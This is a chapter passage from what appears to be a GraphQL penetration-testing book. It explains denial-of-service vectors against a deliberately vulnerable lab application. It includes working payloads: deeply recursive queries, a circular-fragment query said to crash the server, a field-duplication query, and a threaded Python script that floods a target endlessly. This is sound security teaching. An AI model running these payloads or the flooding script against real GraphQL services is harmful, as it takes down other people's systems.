<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 5: Denial of Service</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:c77cce49-9403-4fd1-99ba-33d115574b0c" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_101" title="101"/><a class="XrefDestination" id="5"/><span class="XrefDestination" id="xref-502840c05-001"/>5</span><br/>
<span class="ChapterTitle"><a class="XrefDestination" id="denialofservice"/><span class="XrefDestination" id="xref-502840c05-002"/>Denial of Service</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">DoS issues are one of the most prevalent vulnerability classes in GraphQL today. In this chapter, you’ll learn how GraphQL’s declarative query language can also become its Achilles’ heel. We’ll identify opportunities to carry out DoS attacks that could exhaust server resources if the application developers don’t implement effective security countermeasures.</p>
<p>While DoS vulnerabilities aren’t often classified as a critical vulnerability in penetration testing reports or bounty programs, they’re common enough in GraphQL applications that it’s important to become familiar with them, both from an attacker standpoint and as a defender.</p>
<h2 id="h1-502840c05-0001"><span epub:type="pagebreak" id="Page_102" title="102"/><a class="XrefDestination" id="GraphQLDoSVectors"/><span class="XrefDestination" id="xref-502840c05-003"/>GraphQL DoS Vectors</h2>
<p class="BodyFirst">One of GraphQL’s flagship features is its declarative query language, which allows clients to request very complex data structures from the server. This capability puts the client in a powerful position, because the client can choose the response that a server should return. Given this power, GraphQL servers must have the ability to protect themselves against malicious queries coming from untrusted clients. If a client can construct a query that the server would find expensive to fulfill, it could starve the server for resources. Such attacks could impact the availability of the application by causing downtime or degrading the server’s performance.</p>
<p>In the GraphQL world, several DoS vectors could lead to resource exhaustion conditions: circular queries (also known as <em>recursive queries</em>), field duplication, alias overloading, directive overloading, circular fragments, and object limit overriding. In this chapter, you’ll learn about each vulnerability, how to test for them during a penetration test, and how to use DoS exploit code to abuse them. Toward the end of the chapter, we’ll discuss the security controls that attempt to mitigate some of these threats.</p>
<p>The <em>Common Weakness Enumeration (CWE)</em> system categorizes these types of DoS vectors as<em> Uncontrolled Resource Consumption</em>. The abuse of these vectors might result in excessive consumption of central processing unit (CPU) cycles, significant server memory usage, or the filling up of the disk space, which could prevent other processes from writing to the filesystem. The following are a few examples of how a client could craft queries to trigger these conditions:</p>
<ul class="disc">
<li>The client sends a single request containing one complex query.</li>
<li>The client sends a single request containing multiple complex queries.</li>
<li>The client sends multiple parallel requests, each containing a single complex query.</li>
<li>The client sends multiple parallel requests, each containing multiple complex queries.</li>
<li>The client requests a large number of objects from the server.</li>
</ul>
<p>Certain DoS vectors are possible partially because of add-on features in some GraphQL implementations, introduced either as part of the base installation package or as additional libraries, while other vectors exist in native GraphQL capabilities.</p>
<h2 id="h1-502840c05-0002"><a class="XrefDestination" id="CircularQueries"/><span class="XrefDestination" id="xref-502840c05-004"/>Circular Queries</h2>
<p class="BodyFirst">Also known as <em>recursive queries</em>, <em>circular queries</em> occur when two nodes in a GraphQL schema are bidirectionally referenced using an edge. This circular reference could allow a client to build a complex query that forces the server to return an exponentially large response each time the query completes a “circle.”</p>
<p>In this section, we’ll dive into circular relationships and what they look like in a GraphQL schema. We’ll use multiple tools, such as the <span epub:type="pagebreak" id="Page_103" title="103"/>schema visualizer GraphQL Voyager, Altair, InQL, and GraphQL Cop to identify risky design patterns and test our target application for these vulnerabilities.</p>
<h3 id="h2-502840c05-0001"><a class="XrefDestination" id="CircularRelationshipsinGraphQLSchemas"/><span class="XrefDestination" id="xref-502840c05-005"/>Circular Relationships in GraphQL Schemas</h3>
<p class="BodyFirst">GraphQL’s SDL allows us to define multiple types to represent an application’s data model. These types can be interconnected in such a way that allows a client to “jump” from one type to another if they are linked together. This condition is called a <em>circular relationship</em> or a <em>circular reference</em>.</p>
<p>For example, in earlier chapters, we mentioned that the DVGA target application allows users to create code snippets (called <em>pastes</em>) and upload them to the application. A single paste might contain a title and some content (like code or other arbitrary text). In GraphQL’s SDL, this information can be represented in the following way:</p>
<pre><code>type Paste {
  title: String
  content: String
}</code></pre>
<p>This information is pretty limited as it stands. What if we want to extend our application so that when a client uploads a paste to the application, we can identify which client did so? For example, we could capture some metadata about the uploader, such as their IP address or User-Agent string.</p>
<p>Currently, our data model isn’t structured in a way that allows us to represent this type of information in the API, but extending it is a fairly easy process. We could add additional fields to the <code>Paste</code> object in the following way:</p>
<pre><code>type Paste {
  title: String
  content: String
<b>  user_agent: String</b>
<b>  ip_address: String</b>
}</code></pre>
<p>Another way to structure the SDL to accomplish this goal is to decouple the client metadata from the <code>Paste</code> object. We might want to do this for multiple reasons, such as for better separation of concerns and the ability to extend GraphQL types independently of one another. We could create a separate type, called <code>Owner</code>:</p>
<pre><code>type Owner {
  ip_address: String
  user_agent: String
  name: String
}</code></pre>
<p><span epub:type="pagebreak" id="Page_104" title="104"/>We now have two object types, <code>Paste</code> and <code>Owner</code>. If we wanted to reveal the owner of a given paste, we could link the two types together. We might make a schema adjustment such as the following, to add a field named <code>owner</code> to the <code>Paste</code> type that references the <code>Owner</code> type:</p>
<pre><code>type Paste {
  title: String
  content: String
  user_agent: String
  ip_address: String
<b>  owner: Owner</b>
}</code></pre>
<p>Now a client could request owner information about a paste, such as the owner’s IP address or User-Agent. <a href="#listing5-1" id="listinganchor5-1">Listing 5-1</a> shows the complete example schema.</p>
<pre><code>type Paste {
    title: String
    content: String
    user_agent: String
    ip_address: String
    owner: Owner
}

 type Owner {
    ip_address: String
    user_agent: String
    pastes: [Paste]
    name: String
}</code></pre>
<p class="CodeListingCaption"><a id="listing5-1">Listing 5-1</a>: A circular reference in a schema</p>
<p>The two object types, <code>Paste</code> and <code>Owner</code>, have fields that cross-reference the other. The <code>Paste</code> object type has an <code>owner</code> field that references the <code>Owner</code> object, and the <code>Owner</code> type has a <code>pastes</code> field that references the <code>Paste</code> type. This creates a circular condition.</p>
<p>A malicious client could cause a recursion by forcing the GraphQL server’s function resolver to loop. This could potentially impact the server’s performance. The following query example shows what such a circular query looks like:</p>
<pre><code>query {
  pastes {
    owner {
      pastes {
        owner {
          pastes {
            owner {
              name
            }
          }
<span epub:type="pagebreak" id="Page_105" title="105"/>        }
      }
    }
  }
}</code></pre>
<p>This query is simple to execute yet causes an exponentially large response from the GraphQL server. The more loops in the query, the larger the response becomes.</p>
<p>Circular relationships are common in GraphQL APIs. While not an anti-pattern when it comes to schema design, they should be avoided unless the application is able to gracefully handle complex queries.</p>
<h3 id="h2-502840c05-0002"><a class="XrefDestination" id="IdentifyingCircularRelationships"/><span class="XrefDestination" id="xref-502840c05-006"/>How to Identify Circular Relationships</h3>
<p class="BodyFirst">Identifying circular queries typically requires insight into the GraphQL schema. In white-box penetration tests, we may have access to the SDL files. In black-box penetration tests, we may get lucky and find that the application’s developer has left introspection enabled.</p>
<p>In either case, you should review the schema files for bidirectional relationships between objects using static code analysis approaches or by importing the result of the introspection query into a schema visualizer such as GraphQL Voyager. Additionally, certain dedicated GraphQL security tools, such as InQL, attempt to discover the existence of circular relationships in a more dynamic fashion, by discovering the schema and analyzing its types and their relationships.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">Note</span></h2>
<p>	In <span class="xref" itemid="xref_target_Chapter 6">Chapter 6</span>, we’ll discuss ways of obtaining schema information in a black-box penetration test when introspection has been disabled, such as by attempting to reconstruct it using specialized GraphQL security tools.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h4 id="h3-502840c05-0001"><a class="XrefDestination" id="UsingSchemaDefinitionLanguageFiles"/><span class="XrefDestination" id="xref-502840c05-007"/>Using Schema Definition Language Files</h4>
<p class="BodyFirst">Let’s perform a security review of an example SDL file to identify anomalies. Consider the schema file in the book’s GitHub repository at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/sdl.graphql">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/sdl.graphql</a>. This SDL file is a schema representation of DVGA that defines all queries, mutations, and subscriptions, which also includes object types and fields.</p>
<p>Download the schema file onto your lab machine by copying it and saving it to a file named <em>sdl.graphql</em>. Then open the file in a text editor to review it. Before we highlight where the problems lie, try to spot any relational fields that result in bidirectional object relationships.</p>
<p>The following excerpts show the objects that have bidirectional references:</p>
<pre><code>type PasteObject {
  <var>--snip--</var>
  id: ID!
  ipAddr: String
  ownerId: Int
<span epub:type="pagebreak" id="Page_106" title="106"/>  burn: Boolean
<span aria-label="annotation1" class="CodeAnnotationCode">❶</span> owner: OwnerObject
  <var>--snip--</var>
}

type OwnerObject {
  id: ID!
  name: String
<span aria-label="annotation2" class="CodeAnnotationCode">❷</span> paste: [PasteObject]
  <var>--snip--</var>
}</code></pre>
<p>The schema defines the <code>owner</code> field in the <code>PasteObject</code> of custom type <code>OwnerObject</code> <span aria-label="annotation1" class="CodeAnnotation">❶</span>. Then it defines the <code>paste</code> field of type <code>[PasteObject]</code> <span aria-label="annotation2" class="CodeAnnotation">❷</span>. The square brackets in <code>[PasteObject]</code> indicate an array of objects of type <code>PasteObject</code>. As you can see, these objects cross-reference each other, and clients using these types could potentially abuse them for DoS purposes.</p>
<h4 id="h3-502840c05-0002"><a class="XrefDestination" id="UsingGraphQLVoyager"/><span class="XrefDestination" id="xref-502840c05-008"/>Using GraphQL Voyager</h4>
<p class="BodyFirst">Small SDL files are easy to review. The larger an SDL file is, the more challenging it becomes to identify anti-patterns and manually audit for security issues. Let’s visualize a schema, a technique that could assist us during audits of larger applications with more complex schema definitions.</p>
<p>Upload the SDL file you downloaded earlier to GraphQL Voyager (hosted on <a class="LinkURL" href="http://lab.blackhatgraphql.com:9000">http://lab.blackhatgraphql.com:9000</a> or, alternatively, <a class="LinkURL" href="https://ivangoncharov.github.io/graphql-voyager">https://ivangoncharov.github.io/graphql-voyager</a>) by clicking the <b>Change Schema</b> button and copying the SDL file into the box under the <b>SDL</b> tab. <a href="#figure5-1" id="figureanchor5-1">Figure 5-1</a> shows how Voyager illustrates the circular reference between the <code>PasteObject</code> and <code>OwnerObject</code> objects.</p>
<figure>
<img alt="" class="" src="image_fi/502840c05/f05001.png"/>
<figcaption><p><a id="figure5-1">Figure 5-1</a>: Object relationships in GraphQL Voyager</p></figcaption>
</figure>
<p>GraphQL Voyager highlights custom object types, such as <code>OwnerObject</code> and <code>PasteObject</code>, and uses arrows to indicate object relationships. When you identify such a relationship, assume the application is vulnerable until you’ve performed a test to check its ability to protect against circular queries.</p>
<p><span epub:type="pagebreak" id="Page_107" title="107"/>You can also paste the introspection response output in Voyager to generate the same visual representation of the schema, as we did in earlier chapters.</p>
<h4 id="h3-502840c05-0003"><a class="XrefDestination" id="UsingInQL"/><span class="XrefDestination" id="xref-502840c05-009"/>Using InQL</h4>
<p class="BodyFirst">Another way to identify circular queries is with the InQL security auditing tool. We installed InQL in our lab in <span class="xref" itemid="xref_target_Chapter 2">Chapter 2</span>. One of InQL’s main features is its ability to automatically detect circular relationships. InQL can read JSON files generated by an introspection query via the command line. Alternatively, it can directly send an introspection query to the target GraphQL server if it supports Introspection.</p>
<p>Let’s run an introspection query using Altair. We’ll save the response to a JSON file on our filesystem so InQL can read it, parse it, and traverse the schema to find circular relationships.</p>
<p>In your lab machine, open Altair and set the URL in the address bar to <b><i>http://localhost:5013/graphql</i></b>. Copy the introspection query located at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/queries/introspection_query.txt">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/queries/introspection_query.txt</a> and paste it into Altair (<a href="#figure5-2" id="figureanchor5-2">Figure 5-2</a>). Then click <b>Send Request</b> to send the query to DVGA.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c05/f05002.png"/>
<figcaption><p><a id="figure5-2">Figure 5-2</a>: An introspection query in Altair</p></figcaption>
</figure>
<p>Once a successful response is returned, download the response in JSON format by clicking the <b>Download</b> button at the bottom-right corner of Altair. Save the file as <em>introspection_query.json</em> under the home folder <em>/home/kali</em>.</p>
<p>Next, open the terminal. To execute the circular query check, we’ll pass three flags to InQL: the <code>-f</code> flag, to use the JSON file we downloaded; the <code>--generate-cycles</code> flag, to perform the circular query detection check; and <span epub:type="pagebreak" id="Page_108" title="108"/>the <code>-o</code> flag, to write the output to a dedicated folder. The following command combines these flags to perform the circular query detection:</p>
<pre><code># <b>inql -f /home/kali/introspection_query.json --generate-cycles -o dvga_cycles</b>
[!] Parsing local schema file
[+] Writing Introspection Schema JSON
[+] Writing query Templates
Writing systemUpdate query
Writing pastes query
[+] Writing mutation Templates
Writing createPaste mutation
[+] Writing Query Cycles to introspection_query
[+] DONE</code></pre>
<p>After the check is complete, you’ll notice that a <em>dvga_cycles</em> folder was created by InQL. Within this folder, look for a text file that starts with the word <em>cycles</em>; this file will contain the result of the script’s execution. You can run this command to see the outcome of the check:</p>
<pre><code># <b>cat dvga_cycles/introspection_query/cycles*</b>

Cycles(
        { OwnerObject -[paste]-&gt; PasteObject -[owner]-&gt; OwnerObject }
        { OwnerObject -[pastes]-&gt; PasteObject -[owner]-&gt; OwnerObject }
)</code></pre>
<p>InQL was able to find paths in the schema where a circular relationship exists between the <code>PasteObject</code> and <code>OwnerObject</code> nodes. Under the hood, InQL traversed the JSON file using two main graph algorithms:</p>
<ul class="disc">
<li>The<em> Tarjan algorithm</em>, named after its inventor Robert Tarjan, is used to find circular relationships in graphs in which nodes are connected by edges and each edge has a direction associated with it.</li>
<li>The<em> Johnson algorithm</em>, named after its inventor Donald B. Johnson, is used to find the shortest path between every pair of nodes in a graph.</li>
</ul>
<p>InQL can also run the same check by connecting directly to the GraphQL API and obtaining the introspection information. To do this, use the flag <code class="bold">-t</code> to specify the target:</p>
<pre><code># <b>inql -t http://localhost:5013/graphql --generate-cycles -o dvga_cycles</b>
[+] Writing Introspection Schema JSON
[+] DONE
Writing pastes query
[+] Writing mutation Templates
Writing importPaste mutation
[+] DONE
[+] Writing Query Cycles to localhost:5013</code></pre>
<p>The <code>-t</code> option allows us to scale this check when we have a list of hosts to test. <a href="#listing5-2" id="listinganchor5-2">Listing 5-2</a> shows how to add hosts to a file named <em>hosts.txt</em>.</p>
<pre><code><span epub:type="pagebreak" id="Page_109" title="109"/># <b>cd ~</b>
#<b> echo 'http://localhost:5013/graphql' &gt; hosts.txt</b>
#<b> cat hosts.txt</b>
http://localhost:5013/graphql</code></pre>
<p class="CodeListingCaption"><a id="listing5-2">Listing 5-2</a>: A file containing target GraphQL servers</p>
<p><a href="#listing5-3" id="listinganchor5-3">Listing 5-3</a> shows how to write a Bash loop to test multiple hosts by reading the <em>hosts.txt</em> file.</p>
<pre><code>for host in $(cat hosts.txt); do
    inql -t "$host" --generate-cycles
done</code></pre>
<p class="CodeListingCaption"><a id="listing5-3">Listing 5-3</a>: A Bash <code>for</code> loop to iterate through the target hosts and run InQL against each</p>
<p>The <code>for</code> loop will read the <em>hosts.txt</em> file line by line and assign each line to the <code>host</code> variable. InQL will then use this variable as its target. This technique lets us test dozens of URLs in an automated fashion.</p>
<p>If you attempt to run InQL against large applications, consider using the <code>--cycles-timeout</code> flag to set a timeout on the circular check. This will ensure that the application doesn’t hang while looking for circular queries, if the target schema is of significant size.</p>
<h3 id="h2-502840c05-0003"><a class="XrefDestination" id="TestingforCircularQueryVulnerabilities"/><span class="XrefDestination" id="xref-502840c05-010"/>Circular Query Vulnerabilities</h3>
<p class="BodyFirst">Now that you know how to identify circular queries by using multiple tools, let’s see how sending a circular query would impact the DVGA application. We’ll craft a special GraphQL query that uses the circular relationship we’ve discovered to perform a deeply recursive request.</p>
<p>A successful cyclical query will cause heavy load on the server and possibly crash it. As a result, testing circular queries can be risky. To be on the safe side, we’ll provide both a safe and an unsafe version of a circular query. The safe version will have less circularity than the unsafe one, so you can safely experiment with it in the lab without crashing the target.</p>
<p>Open Altair and copy in the <em>safe-circular-query.graphql</em> file from <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/safe-circular-query.graphql">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/safe-circular-query.graphql</a>. <a href="#listing5-4" id="listinganchor5-4">Listing 5-4</a> shows this query.</p>
<pre><code>query {
  pastes {
    owner {
      pastes {
        owner {
          name
        }
      }
    }
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing5-4">Listing 5-4</a>: A recursive query in GraphQL</p>
<p><span epub:type="pagebreak" id="Page_110" title="110"/>As the name indicates, <em>safe-circular-query.graphql </em>is the safer version of a circular query. In this query, we ask for the owners’ names of all pastes on the application, except we’re doing so in circles, which exponentially increases the number of objects the GraphQL server has to load. Paste the query into Altair and run it against the server to prove the concept of circular queries.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	If you feel adventurous and are curious to see the impact that a more complex circular query would have on our vulnerable target, you can find the unsafe version of the query at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/unsafe-circular-query.graphql">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/unsafe-circular-query.graphql</a>. This query could crash the DVGA instance and possibly the hypervisor, so use it with caution.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h3 id="h2-502840c05-0004"><a class="XrefDestination" id="TestingforCircularIntrospectionVulnerabilities"/><span class="XrefDestination" id="xref-502840c05-011"/>Circular Introspection Vulnerabilities</h3>
<p class="BodyFirst">A circular relationship exists in GraphQL’s built-in introspection system. Therefore, when introspection is enabled, you could potentially have access to a circular query right out of the gate.</p>
<p>The introspection system has its own schema, defined in the official GraphQL specification document. Here is an excerpt of it:</p>
<pre><code>type __Schema {
  <var>--snip--</var>
  types: <span aria-label="annotation1" class="CodeAnnotationCode">❶</span> [__Type!]!
  queryType: __Type!
  mutationType: __Type
  subscriptionType: __Type
  directives: [__Directive!]!
  <var>--snip--</var>
}


type <span aria-label="annotation2" class="CodeAnnotationCode">❷</span> __Type {
  <var>--snip--</var>
  name: String
  description: String
  fields(includeDeprecated: Boolean = false): <span aria-label="annotation3" class="CodeAnnotationCode">❸</span> [__Field!]
  <var>--snip--</var>
}

type <span aria-label="annotation4" class="CodeAnnotationCode">❹</span> __Field {
  <var>--snip--</var>
  name: String!
  description: String
  args: [__InputValue!]!
  type: <span aria-label="annotation5" class="CodeAnnotationCode">❺</span> __Type!
  isDeprecated: Boolean!
  <var>--snip--</var>
}</code></pre>
<p><span epub:type="pagebreak" id="Page_111" title="111"/>At <span aria-label="annotation1" class="CodeAnnotation">❶</span>, the <code>types</code> field is defined for the <code>__Schema</code> object type. You can see that <code>types</code> is set to <code>[__Type!]</code>, which means that it’s using the <code>__Type</code> object defined at <span aria-label="annotation2" class="CodeAnnotation">❷</span>. The square brackets and exclamation point mean that the <code>types</code> field will return a non-nullable array of <code>__Type</code> objects.</p>
<p>The <code>__Type</code> object has a <code>fields</code> field, set at <span aria-label="annotation3" class="CodeAnnotation">❸</span>, of type <code>[__Field!]</code>. This will return a non-nullable array containing <code>__Field</code> objects. At <span aria-label="annotation4" class="CodeAnnotation">❹</span>, the <code>__Field</code> type is defined. This type has a field named <code>type</code> at <span aria-label="annotation5" class="CodeAnnotation">❺</span> referencing the <code>__Type</code> object. As you can see, we have a circular relationship between <code>__Type.fields</code> and <code>__Field.type</code>.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	The full introspection system schema can be found in the GraphQL specification document at <a class="LinkURL" href="https://spec.graphql.org/October2021/#sec-Schema-Introspection.Schema-Introspection-Schema">https://spec.graphql.org/October2021/#sec-Schema-Introspection.Schema-Introspection-Schema</a>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>You can easily test this circular relationship by running the following query with Altair:</p>
<pre><code>query {
  __schema {
    types {
      fields {
        type {
          fields {
            type {
              fields {
                name
              }
            }
          }
        }
      }
    }
  }
}</code></pre>
<p>Such circular queries can be fairly easily exploited. While a single query may not be able to take down a server, a series of complex queries could have the potential to impact it.</p>
<h3 id="h2-502840c05-0005"><a class="XrefDestination" id="TestingforCircularFragmentVulnerabilities"/><span class="XrefDestination" id="xref-502840c05-012"/>Circular Fragment Vulnerabilities</h3>
<p class="BodyFirst">GraphQL operations can share logic through the use of fragments, as explained in <span class="xref" itemid="xref_target_Chapter 3">Chapter 3</span>. Fragments are defined by the client, and as such, clients can build any logic they desire into them. That said, the GraphQL specification documentation contains rules about how fragments should be implemented, including this one:</p>
<blockquote class="blockquote">
<p class="Blockquote">The graph of fragment spreads must not form any cycles including spreading itself. Otherwise, an operation could infinitely spread or infinitely execute on cycles in the underlying data.</p>
</blockquote>
<p><span epub:type="pagebreak" id="Page_112" title="112"/>Let’s explore how fragments can be constructed to form a cycle and lead to a DoS. In DVGA, run the following query, which uses a fragment named <code>Start</code> on the object <code>PasteObject</code>. The <code>pastes</code> field utilizes this fragment using the <code>...Start</code> syntax:</p>
<pre><code>query {
  pastes {
<b>    ...Start</b>
  }
}

fragment <b>Start </b>on <b>PasteObject</b> {
  title
  content
}</code></pre>
<p>When the query is executed, it returns the <code>field</code> and <code>content</code> fields of <code>pastes</code>:</p>
<pre><code>"pastes": [
  {
    "title": "My Title",
    "content": "My First Paste"
  }
]</code></pre>
<p>Now, what if we add another fragment named <code>End</code> that uses the <code>Start</code> fragment, and modify the <code>Start</code> fragment to use the <code>End</code> fragment? An interesting condition will occur here:</p>
<pre><code>query CircularFragment {
  pastes {
    <b>...Start</b>
  }
}

fragment <b>Start</b> on PasteObject {
  title
  content
  <b>...End</b>
}

fragment<b> End</b> on PasteObject {
  <b>...Start</b>
}</code></pre>
<p>This condition leads to an infinite execution, just as the GraphQL specification suggests. Try experimenting with this query in the lab.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">Note</span></h2>
<p>	Executing this query will immediately crash DVGA with a segmentation fault error. Make sure to execute it only in the virtual lab. After you run the query, DVGA should no longer be available. To start it again, simply follow the steps from <span class="xref" itemid="xref_target_Chapter 2">Chapter 2</span> to create another Docker container.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p><span epub:type="pagebreak" id="Page_113" title="113"/>If you ran the query, you should have seen a pretty immediate crash! You might be wondering, are all GraphQL servers vulnerable to this attack? The short answer is no, if the GraphQL server is spec compliant. A GraphQL server is supposed to reject such queries before they get executed. Still, you never know when you might run into a completely custom implementation in a penetration test, so knowing about this technique is worthwhile.</p>
<h2 id="h1-502840c05-0003"><a class="XrefDestination" id="FieldDuplication"/><span class="XrefDestination" id="xref-502840c05-013"/>Field Duplication</h2>
<p class="BodyFirst"><em>Field duplication</em> vulnerabilities concern queries that contain repeating fields. They are simple to execute, yet less effective than circular queries.</p>
<p>While circular queries are small queries that result in abnormally large responses, field duplications are large queries that exhaust the server because of the amount of time they take to process and resolve. To effectively abuse GraphQL APIs by using field duplications, you must send a constant stream of queries to keep the server’s resources continuously busy.</p>
<h3 id="h2-502840c05-0006"><a class="XrefDestination" id="UnderstandingHowFieldDuplicationWorks"/><span class="XrefDestination" id="xref-502840c05-014"/>Understanding How Field Duplication Works</h3>
<p class="BodyFirst">To understand how field duplication works, consider the following GraphQL query:</p>
<pre><code>query {
  pastes {
     title
     content
  }
}</code></pre>
<p>This query returns the <code>title</code> and <code>content</code> fields of all pastes in the application. When GraphQL receives this query, it will use its query resolvers to provide each field requested.</p>
<p>If we “stuff” additional fields in the query, GraphQL will be forced to resolve each field separately. This behavior could introduce additional load on the server, cause performance degradation, or completely crash it.</p>
<p>The strategy here is fairly simple: choose a field that you think might be expensive to resolve, and stuff the query with additional copies of that field’s name. <a href="#listing5-5" id="listinganchor5-5">Listing 5-5</a> shows an example query.</p>
<pre><code>query {
  pastes {
     title
     content
     content
     content
     content
     content
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing5-5">Listing 5-5</a>: A GraphQL query with repeating fields</p>
<p><span epub:type="pagebreak" id="Page_114" title="114"/>When a query contains multiple repeating fields, such as in <a href="#listing5-5">Listing 5-5</a>, where <code>content</code> is repeated five times, you might expect to see the same five fields in the response. In reality, GraphQL will consolidate the response and display only a single <code>content</code> JSON field:</p>
<pre><code>{
  "data": {
    "pastes": [
      {
        "title": "My Title",
        "content": "My First Paste"
      }
    ]
  }
}</code></pre>
<p>From a client perspective, it might seem like GraphQL is ignoring our repeating fields. Fortunately, this is not the case. Through response time analysis, you can see the query’s impact on the server. Unless the server has implemented specific security defenses, such as query cost analysis (covered later in this chapter), you should expect to see these vulnerabilities in most GraphQL implementations.</p>
<h3 id="h2-502840c05-0007"><a class="XrefDestination" id="TestingforFieldDuplicationVulnerabilities"/><span class="XrefDestination" id="xref-502840c05-015"/>Testing for Field Duplication Vulnerabilities</h3>
<p class="BodyFirst">To test field duplication attacks in our lab, we’ll write a simple query and attempt to repeat a few selected fields to see how our target responds.</p>
<p>Open Altair and ensure that the address bar is set to <em>http://localhost:5013/graphql</em>. In the left pane, enter the following query, which will serve as a baseline:</p>
<pre><code><b>query {</b>
<b>   pastes {</b>
<b>      content</b>
<b>   }</b>
<b>}</b></code></pre>
<p>Click<b> Send</b> to query GraphQL. In the response section, you’ll notice that Altair provides the total time it took for the server to respond in milliseconds, as shown in <a href="#figure5-3" id="figureanchor5-3">Figure 5-3</a>.</p>
<p>It took 26 milliseconds for DVGA to respond to the query, which is a normal response time. The time you might see in your lab could differ but should be in the same ballpark.</p>
<span epub:type="pagebreak" id="Page_115" title="115"/><figure>
<img alt="" class="" src="image_fi/502840c05/f05003.png"/>
<figcaption><p><a id="figure5-3">Figure 5-3</a>: The Altair response time indicator</p></figcaption>
</figure>
<p>Next, copy the query from <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/field-duplication.graphql">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/field-duplication.graphql</a>, paste it into Altair, and run it. This query contains approximately 1,000 <code>content</code> fields. <a href="#figure5-4" id="figureanchor5-4">Figure 5-4</a> shows that processing this query took 958 milliseconds, which is 36 times slower!</p>
<figure>
<img alt="" class="" src="image_fi/502840c05/f05004.png"/>
<figcaption><p><a id="figure5-4">Figure 5-4</a>: A slower response time to a query with repeating fields</p></figcaption>
</figure>
<p>Some fields will require more resources to resolve, so the performance impact might vary depending on the chosen field.</p>
<p>This attack requires the client to continuously send large payloads. Attempting to manually exploit field duplication can be cumbersome. As an alternative method, you can use a special Python exploit that attempts to perform a field duplication attack at a far larger scale. <a href="#listing5-6" id="listinganchor5-6">Listing 5-6</a> shows <span epub:type="pagebreak" id="Page_116" title="116"/>a snippet of such an exploit. It sends a continuous stream of queries to a remote server in order to exhaust its resources.</p>
<pre><code>THREADS = 50

<span aria-label="annotation1" class="CodeAnnotationHang">❶</span> payload = 'content \n title \n' * 1000
<span aria-label="annotation2" class="CodeAnnotationHang">❷</span> query = {'query':'query { \n ' + payload + '}'}

<span aria-label="annotation3" class="CodeAnnotationHang">❸</span> def DoS():
    try:
      r = requests.post(GRAPHQL_URL, json=query)
      print('Time took: {} seconds '.format(r.elapsed.total_seconds()))
      print('Response:', r.json())
    except Exception as e:
      print('Error', e.message)

<span aria-label="annotation4" class="CodeAnnotationHang">❹</span> while True:
    print('Running...')
    time.sleep(2)
    for _ in range(THREADS):
      t = threading.Thread(target=DoS, args=())
      t.start()</code></pre>
<p class="CodeListingCaption"><a id="listing5-6">Listing 5-6</a>: A field duplication exploit</p>
<p>This code creates a dynamic <code>payload</code> variable <span aria-label="annotation1" class="CodeAnnotation">❶</span> with two duplicated fields: <code>content</code> and <code>title</code>. Each is repeated 1,000 times. At <span aria-label="annotation2" class="CodeAnnotation">❷</span> it concatenates the payload with the <code>query</code> JSON variable. It then defines a function named <code>DoS</code> that is responsible for sending the HTTP POST request containing our malicious GraphQL query <span aria-label="annotation3" class="CodeAnnotation">❸</span>. We run an infinite <code>while</code> loop that executes the <code>DoS</code> function using 50 threads every two seconds <span aria-label="annotation4" class="CodeAnnotation">❹</span>. The full exploit code can be found on GitHub at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/exploit_threaded_field_dup.py">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/exploit_threaded_field_dup.py</a>.</p>
<p>You can download this exploit and run it against DVGA with the following command. Keep in mind that performance could degrade on your machine while it is running:</p>
<pre><code># <b>python3 exploit_threaded_field_dup.py http://localhost:5013/graphql</b></code></pre>
<p>Since the exploit uses an infinite loop, it won’t stop its operations on its own; you can halt it by pressing CTRL-C to send the <em>SIGINT</em> signal.</p>
<h2 id="h1-502840c05-0004"><a class="XrefDestination" id="AliasOverloading"/><span class="XrefDestination" id="xref-502840c05-016"/>Alias Overloading</h2>
<p class="BodyFirst">In <span class="xref" itemid="xref_target_Chapter 3">Chapter 3</span>, you learned how to use aliases to rename duplicate fields so that the GraphQL server treats them as two different queries. The ability to run multiple queries in a single HTTP request is quite powerful. Security analysts could easily overlook these single requests when hunting for suspicious traffic (as could WAFs). After all, they might think, what harm can a single HTTP request possibly cause?</p>
<p><span epub:type="pagebreak" id="Page_117" title="117"/>By default, GraphQL servers won’t limit the number of aliases that can be used in a single request. The GraphQL application maintainer could implement custom protections, such as counting the aliases and restricting them in some middleware, but since aliases are part of the specification, it’s uncommon to remove support for them or limit their functionality.</p>
